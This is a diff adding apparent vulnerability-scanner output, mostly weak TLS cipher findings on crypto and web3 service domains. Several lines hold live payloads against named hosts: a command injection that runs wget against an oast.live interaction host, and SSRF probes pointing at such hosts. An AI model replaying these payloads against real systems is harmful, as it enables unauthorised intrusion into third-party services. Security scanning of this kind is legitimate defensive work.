@@ -1,0 +1,36 @@
+[CVE-2014-3206] [http] [critical] https://mail.particle.network/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d8t1hkbomj13f5bqn77gewat5fi63pxjw.oast.live;
+[CVE-2019-19824] [http] [high] https://mail.particle.network/boafrm/formSysCmd
+[CVE-2021-36380] [http] [critical] https://mail.particle.network/cgi/networkDiag.cgi
+[targa-camera-ssrf] [http] [high] https://mail.particle.network/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE
+[ssrf-via-oauth-misconfig] [http] [medium] https://mail.particle.network/connect/register
+[generic-blind-xxe] [http] [high] https://mail.particle.network
+[xmlrpc-pingback-ssrf] [http] [high] https://mail.particle.network/xmlrpc/pingback
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
+[weak-cipher-suites:tls-1.0] [ssl] [low] lumio-testnet.proxy.pontem.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] lumio-testnet.proxy.pontem.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] magic.solflare.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] magic.solflare.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mail.zengo.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mailer.tiplink.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mailer.tiplink.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mail.zengo.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] main-alb-cdn.solflare.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] main-alb.solflare.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] main-alb-cdn.solflare.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mainnet-full-snapshots.base.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] main-alb.solflare.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mainnet-full-snapshots.base.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mainnet-reth-pruned-snapshots.base.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mainnet-reth-archive-snapshots.base.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mainnet-reth-archive-snapshots.base.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mainnet-reth-pruned-snapshots.base.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] markets.coin98.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] markets.coin98.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mc.meteorwallet.app:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mc.meteorwallet.app:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] memberships.fewcha.app:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] memberships.fewcha.app:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[CVE-2020-5775] [http] [medium] https://mail.particle.network/external_content/retrieve/oembed?endpoint=http://d8t1hkbomj13f5bqn77guctaynje3czjx.oast.live&url=foo
+[CVE-2024-34351] [http] [high] https://lrc-smart-wallet.web3auth.io/_next/image?w=16&q=10&url=https://d8t1hkbomj13f5bqn77gmi5urw3sxtp55.oast.live
+[CVE-2024-34351] [http] [high] https://lrc-accounts.web3auth.io/_next/image?w=16&q=10&url=https://d8t1hkbomj13f5bqn77g98aj6q71nbeyn.oast.live
+[aws-bucket-takeover] [http] [high] https://memberships.fewcha.app ["memberships.fewcha.app"]
